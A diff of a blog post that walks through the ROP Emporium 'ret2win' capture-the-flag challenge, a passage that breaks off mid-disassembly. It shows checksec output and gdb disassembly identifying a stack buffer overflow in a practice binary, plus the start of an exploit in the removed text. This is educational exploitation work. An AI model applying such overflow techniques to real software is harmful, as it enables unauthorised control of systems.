@@ -1,23 +1,41 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Introduction GOAL: Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.
-find the address of the ret2win and determine the size of the buffer by looking at the gdb.
-(gdb) info functions All defined functions: Non-debugging symbols: 0x0000000000400528 _init 0x0000000000400550 puts@plt 0x0000000000400560 system@plt 0x0000000000400570 printf@plt 0x0000000000400580 memset@plt 0x0000000000400590 read@plt 0x00000000004005a0 setvbuf@plt 0x00000000004005b0 _start 0x00000000004005e0 _dl_relocate_static_pie 0x00000000004005f0 deregister_tm_clones 0x0000000000400620 register_tm_clones 0x0000000000400660 __do_global_dtors_aux 0x0000000000400690 frame_dummy 0x0000000000400697 main 0x00000000004006e8 pwnme 0x0000000000400756 ret2win 0x0000000000400780 __libc_csu_init 0x00000000004007f0 __libc_csu_fini 0x00000000004007f4 _fini (gdb) from the disassembly of the pwnme function, we can determine the size of the buffer we reading to.'><title>Return-Oriented Programming - Ret2win</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Introduction Challenge description
+ Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.
+ This challenge is classical pwn challenge of overwriting the return address with desired address you want to return to.
+The binaries for the challenges can be downloaded from the author`s website ropemporium.The goal of first challenge is to call the ret2win function.
+After downloading the binary, the first thing is to check the binary protection enabled on the binary using checksec utility.'><title>Return-Oriented Programming - Ret2win</title>
 
 <link rel='canonical' href='https://thuri10.github.io/p/return-oriented-programming-ret2win/'>
 
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='Return-Oriented Programming - Ret2win'>
-<meta property='og:description' content='Introduction GOAL: Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.
-find the address of the ret2win and determine the size of the buffer by looking at the gdb.
-(gdb) info functions All defined functions: Non-debugging symbols: 0x0000000000400528 _init 0x0000000000400550 puts@plt 0x0000000000400560 system@plt 0x0000000000400570 printf@plt 0x0000000000400580 memset@plt 0x0000000000400590 read@plt 0x00000000004005a0 setvbuf@plt 0x00000000004005b0 _start 0x00000000004005e0 _dl_relocate_static_pie 0x00000000004005f0 deregister_tm_clones 0x0000000000400620 register_tm_clones 0x0000000000400660 __do_global_dtors_aux 0x0000000000400690 frame_dummy 0x0000000000400697 main 0x00000000004006e8 pwnme 0x0000000000400756 ret2win 0x0000000000400780 __libc_csu_init 0x00000000004007f0 __libc_csu_fini 0x00000000004007f4 _fini (gdb) from the disassembly of the pwnme function, we can determine the size of the buffer we reading to.'>
+<link rel="stylesheet" href="/scss/style.min.775dbd4fd34fda61c5273b4bc3415f7c9666414fb6c40aab164a7ded4397da98.css"><meta property='og:title' content='Return-Oriented Programming - Ret2win'>
+<meta property='og:description' content='Introduction Challenge description
+ Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.
+ This challenge is classical pwn challenge of overwriting the return address with desired address you want to return to.
+The binaries for the challenges can be downloaded from the author`s website ropemporium.The goal of first challenge is to call the ret2win function.
+After downloading the binary, the first thing is to check the binary protection enabled on the binary using checksec utility.'>
 <meta property='og:url' content='https://thuri10.github.io/p/return-oriented-programming-ret2win/'>
 <meta property='og:site_name' content='Solar Bits'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='ropemprium' /><meta property='article:tag' content='rop' /><meta property='article:tag' content='pwn' /><meta property='article:tag' content='ctf' /><meta property='article:published_time' content='2021-12-20T20:49:23&#43;03:00'/><meta property='article:modified_time' content='2021-12-20T20:49:23&#43;03:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='ropemporium' /><meta property='article:tag' content='rop' /><meta property='article:tag' content='pwn' /><meta property='article:published_time' content='2021-12-20T20:49:23&#43;03:00'/><meta property='article:modified_time' content='2021-12-20T20:49:23&#43;03:00'/><meta property='og:image' content='https://thuri10.github.io/post/ropemporium/ret2win.jpg' />
 <meta name="twitter:title" content="Return-Oriented Programming - Ret2win">
-<meta name="twitter:description" content="Introduction GOAL: Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.
-find the address of the ret2win and determine the size of the buffer by looking at the gdb.
-(gdb) info functions All defined functions: Non-debugging symbols: 0x0000000000400528 _init 0x0000000000400550 puts@plt 0x0000000000400560 system@plt 0x0000000000400570 printf@plt 0x0000000000400580 memset@plt 0x0000000000400590 read@plt 0x00000000004005a0 setvbuf@plt 0x00000000004005b0 _start 0x00000000004005e0 _dl_relocate_static_pie 0x00000000004005f0 deregister_tm_clones 0x0000000000400620 register_tm_clones 0x0000000000400660 __do_global_dtors_aux 0x0000000000400690 frame_dummy 0x0000000000400697 main 0x00000000004006e8 pwnme 0x0000000000400756 ret2win 0x0000000000400780 __libc_csu_init 0x00000000004007f0 __libc_csu_fini 0x00000000004007f4 _fini (gdb) from the disassembly of the pwnme function, we can determine the size of the buffer we reading to.">
+<meta name="twitter:description" content="Introduction Challenge description
+ Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.
+ This challenge is classical pwn challenge of overwriting the return address with desired address you want to return to.
+The binaries for the challenges can be downloaded from the author`s website ropemporium.The goal of first challenge is to call the ret2win function.
+After downloading the binary, the first thing is to check the binary protection enabled on the binary using checksec utility."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://thuri10.github.io/post/ropemporium/ret2win.jpg' />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-DC4ZP2YRDZ"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-DC4ZP2YRDZ', { 'anonymize_ip': false });
+}
+</script>
+
     </head>
     <body class="
     article-page has-toc
@@ -64,8 +82,16 @@ find the address of the ret2win and determine the size of the buffer by looking 
         </div>
     
 <main class="main full-width">
-    <article class="main-article">
+    <article class="has-image main-article">
     <header class="article-header">
+        <div class="article-image">
+            <a href="/p/return-oriented-programming-ret2win/">
+                
+                    <img src="/post/ropemporium/ret2win.jpg" loading="lazy" alt="Featured image of post Return-Oriented Programming - Ret2win" />
+                
+            </a>
+        </div>
+    
 
     <div class="article-details">
     
@@ -104,7 +130,7 @@ find the address of the ret2win and determine the size of the buffer by looking 
 
 
                 <time class="article-time--reading">
-                    2 minute read
+                    4 minute read
                 </time>
             </div>
         
@@ -115,87 +141,140 @@ find the address of the ret2win and determine the size of the buffer by looking 
 
     <section class="article-content">
     <h2 id="introduction">Introduction</h2>
-<p>GOAL:
-Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.</p>
-<p>find the address of the  ret2win and determine  the size of the buffer by looking at the gdb.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">(</span>gdb<span style="color:#ff79c6">)</span> info functions
-All defined functions:
+<p>Challenge description</p>
+<blockquote>
+<p>Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.</p>
+</blockquote>
+<p>This challenge is classical pwn challenge of overwriting the return address with desired address you want to return to.</p>
+<p>The binaries for the challenges can be downloaded from the author`s website <a class="link" href="https://ropemporium.com"  target="_blank" rel="noopener"
+    >ropemporium</a>.The goal of first challenge is to call the <strong>ret2win</strong> function.</p>
+<p>After downloading the binary, the first thing is to check the binary protection enabled on the binary using checksec utility.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">vx@archie:ret2win$ checksec --file ret2win
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span style="color:#5bc4bf">(</span>0x400000<span style="color:#5bc4bf">)</span>
+</code></pre></div><p>Only <strong>NX</strong> (Not executable) is enabled on the binary meaning we cannot execute code stored on the stack like shellcode.and the behavior of this program we will use gdb. gdb is a tools that enables to inspect the behavior of binaries at runtime.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) <span style="color:#ef6155">info</span> <span style="color:#ef6155">functions</span>
+<span style="color:#06b6ef">All</span> <span style="color:#ef6155">defined</span> <span style="color:#ef6155">functions</span>:
 
-Non-debugging symbols:
-0x0000000000400528  _init
-0x0000000000400550  puts@plt
-0x0000000000400560  system@plt
-0x0000000000400570  printf@plt
-0x0000000000400580  memset@plt
-0x0000000000400590  read@plt
-0x00000000004005a0  setvbuf@plt
-0x00000000004005b0  _start
-0x00000000004005e0  _dl_relocate_static_pie
-0x00000000004005f0  deregister_tm_clones
-0x0000000000400620  register_tm_clones
-0x0000000000400660  __do_global_dtors_aux
-0x0000000000400690  frame_dummy
-0x0000000000400697  main
-0x00000000004006e8  pwnme
-0x0000000000400756  ret2win
-0x0000000000400780  __libc_csu_init
-0x00000000004007f0  __libc_csu_fini
-0x00000000004007f4  _fini
-<span style="color:#ff79c6">(</span>gdb<span style="color:#ff79c6">)</span> 
-</code></pre></div><p>from the disassembly of the pwnme function, we can determine the size of the buffer we reading to.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#ff79c6">(</span>gdb<span style="color:#ff79c6">)</span> disas pwnme
-Dump of assembler code <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">function</span> pwnme:
-   0x00000000004006e8 &lt;+0&gt;:	push   rbp
-   0x00000000004006e9 &lt;+1&gt;:	mov    rbp,rsp
-   0x00000000004006ec &lt;+4&gt;:	sub    rsp,0x20
-   0x00000000004006f0 &lt;+8&gt;:	lea    rax,<span style="color:#ff79c6">[</span>rbp-0x20<span style="color:#ff79c6">]</span>
-   0x00000000004006f4 &lt;+12&gt;:	mov    edx,0x20
-   0x00000000004006f9 &lt;+17&gt;:	mov    esi,0x0
-   0x00000000004006fe &lt;+22&gt;:	mov    rdi,rax
-   0x0000000000400701 &lt;+25&gt;:	call   0x400580 &lt;memset@plt&gt;
-   0x0000000000400706 &lt;+30&gt;:	mov    edi,0x400838
-   0x000000000040070b &lt;+35&gt;:	call   0x400550 &lt;puts@plt&gt;
-   0x0000000000400710 &lt;+40&gt;:	mov    edi,0x400898
-   0x0000000000400715 &lt;+45&gt;:	call   0x400550 &lt;puts@plt&gt;
-   0x000000000040071a &lt;+50&gt;:	mov    edi,0x4008b8
-   0x000000000040071f &lt;+55&gt;:	call   0x400550 &lt;puts@plt&gt;
-   0x0000000000400724 &lt;+60&gt;:	mov    edi,0x400918
-   0x0000000000400729 &lt;+65&gt;:	mov    eax,0x0
-   0x000000000040072e &lt;+70&gt;:	call   0x400570 &lt;printf@plt&gt;
-   0x0000000000400733 &lt;+75&gt;:	lea    rax,<span style="color:#ff79c6">[</span>rbp-0x20<span style="color:#ff79c6">]</span>
-   0x0000000000400737 &lt;+79&gt;:	mov    edx,0x38
-   0x000000000040073c &lt;+84&gt;:	mov    rsi,rax
-   0x000000000040073f &lt;+87&gt;:	mov    edi,0x0
-   0x0000000000400744 &lt;+92&gt;:	call   0x400590 &lt;read@plt&gt;
-   0x0000000000400749 &lt;+97&gt;:	mov    edi,0x40091b
-   0x000000000040074e &lt;+102&gt;:	call   0x400550 &lt;puts@plt&gt;
-   0x0000000000400753 &lt;+107&gt;:	nop
-   0x0000000000400754 &lt;+108&gt;:	leave  
-   0x0000000000400755 &lt;+109&gt;:	ret    
-End of assembler dump.
-</code></pre></div><p>from the above code, we are have a buffer of size 0x20(32bytes), but we are reading the  more than the buffer thus doing a stack buffer overflow.</p>
-<p>our exploit for ret2win challenge is</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#ff79c6">import</span> pwn
+<span style="color:#06b6ef">Non</span><span style="color:#5bc4bf">-</span><span style="color:#ef6155">debugging</span> <span style="color:#ef6155">symbols</span>:
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400528</span>  <span style="color:#ef6155">_init</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400550</span>  <span style="color:#ef6155">puts@plt</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400560</span>  <span style="color:#ef6155">system@plt</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400570</span>  <span style="color:#ef6155">printf@plt</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400580</span>  <span style="color:#ef6155">memset@plt</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400590</span>  <span style="color:#ef6155">read@plt</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004005a0</span>  <span style="color:#ef6155">setvbuf@plt</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004005b0</span>  <span style="color:#ef6155">_start</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004005e0</span>  <span style="color:#ef6155">_dl_relocate_static_pie</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004005f0</span>  <span style="color:#ef6155">deregister_tm_clones</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400620</span>  <span style="color:#ef6155">register_tm_clones</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400660</span>  <span style="color:#ef6155">__do_global_dtors_aux</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400690</span>  <span style="color:#ef6155">frame_dummy</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400697</span>  <span style="color:#ef6155">main</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006e8</span>  <span style="color:#ef6155">pwnme</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400756</span>  <span style="color:#ef6155">ret2win</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400780</span>  <span style="color:#ef6155">__libc_csu_init</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004007f0</span>  <span style="color:#ef6155">__libc_csu_fini</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004007f4</span>  <span style="color:#ef6155">_fini</span>
+<span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) 
+</code></pre></div><p>The binary has various functions has as shown in the output above.For initial analysis we start at the main function which is the entrypoint of our program.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#ef6155">(</span><span style="color:#06b6ef">No</span> <span style="color:#ef6155">debugging</span> <span style="color:#ef6155">symbols</span> <span style="color:#ef6155">found</span> <span style="color:#ef6155">in</span> <span style="color:#ef6155">ret2win</span>)
+<span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) di<span style="color:#ef6155">sas</span> <span style="color:#ef6155">main</span>
+<span style="color:#06b6ef">Dump</span> <span style="color:#ef6155">of</span> <span style="color:#ef6155">assembler</span> <span style="color:#ef6155">code</span> <span style="color:#ef6155">for</span> <span style="color:#ef6155">function</span> <span style="color:#ef6155">main</span>:
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400697</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">0</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">push</span>   rbp
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400698</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">1</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    rbp,rsp
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000040069b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">4</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    rax,<span style="color:#fec418">QWORD</span> <span style="color:#ef6155">PTR</span> [<span style="color:#ef6155">rip</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x2009b6</span>]        <span style="color:#ef6155">#</span> <span style="color:#f99b15">0x601058</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">stdout@@GLIBC_2.2.5</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006a2</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">11</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    ecx,<span style="color:#f99b15">0x0</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006a7</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">16</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    edx,<span style="color:#f99b15">0x2</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006ac</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">21</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    esi,<span style="color:#f99b15">0x0</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006b1</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">26</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    rdi,rax
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006b4</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">29</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x4005a0</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">setvbuf@plt</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006b9</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">34</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    edi,<span style="color:#f99b15">0x400808</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006be</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">39</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x400550</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">puts@plt</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006c3</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">44</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    edi,<span style="color:#f99b15">0x400820</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006c8</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">49</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x400550</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">puts@plt</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006cd</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">54</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    eax,<span style="color:#f99b15">0x0</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006d2</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">59</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x4006e8</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">pwnme</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006d7</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">64</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    edi,<span style="color:#f99b15">0x400828</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006dc</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">69</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x400550</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">puts@plt</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006e1</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">74</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    eax,<span style="color:#f99b15">0x0</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006e6</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">79</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">pop</span>    rbp
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006e7</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">80</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">ret</span>    
+<span style="color:#06b6ef">End</span> <span style="color:#ef6155">of</span> <span style="color:#ef6155">assembler</span> <span style="color:#ef6155">dump.</span>
+<span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) 
+</code></pre></div><p>From the initial analysis of the main function, we are calling an interesting function called <strong>pwnme</strong>. Next disassemble <strong>pwnme</strong> function to understand the behavior.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) di<span style="color:#ef6155">sas</span> <span style="color:#ef6155">pwnme</span>
+<span style="color:#06b6ef">Dump</span> <span style="color:#ef6155">of</span> <span style="color:#ef6155">assembler</span> <span style="color:#ef6155">code</span> <span style="color:#ef6155">for</span> <span style="color:#ef6155">function</span> <span style="color:#ef6155">pwnme</span>:
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006e8</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">0</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">push</span>   rbp
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006e9</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">1</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    rbp,rsp
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006ec</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">4</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">sub</span>    rsp,<span style="color:#f99b15">0x20</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006f0</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">8</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">lea</span>    rax,[rbp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0x20</span>]
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006f4</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">12</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    edx,<span style="color:#f99b15">0x20</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006f9</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">17</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    esi,<span style="color:#f99b15">0x0</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006fe</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">22</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    rdi,rax
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400701</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">25</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x400580</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">memset@plt</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400706</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">30</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    edi,<span style="color:#f99b15">0x400838</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000040070b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">35</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x400550</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">puts@plt</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400710</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">40</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    edi,<span style="color:#f99b15">0x400898</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400715</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">45</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x400550</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">puts@plt</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000040071a</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">50</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    edi,<span style="color:#f99b15">0x4008b8</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000040071f</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">55</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x400550</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">puts@plt</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400724</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">60</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    edi,<span style="color:#f99b15">0x400918</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400729</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">65</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    eax,<span style="color:#f99b15">0x0</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000040072e</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">70</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x400570</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">printf@plt</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400733</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">75</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">lea</span>    rax,[rbp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0x20</span>]
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400737</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">79</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    edx,<span style="color:#f99b15">0x38</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000040073c</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">84</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    rsi,rax
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000040073f</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">87</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    edi,<span style="color:#f99b15">0x0</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400744</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">92</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x400590</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">read@plt</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400749</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">97</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    edi,<span style="color:#f99b15">0x40091b</span>
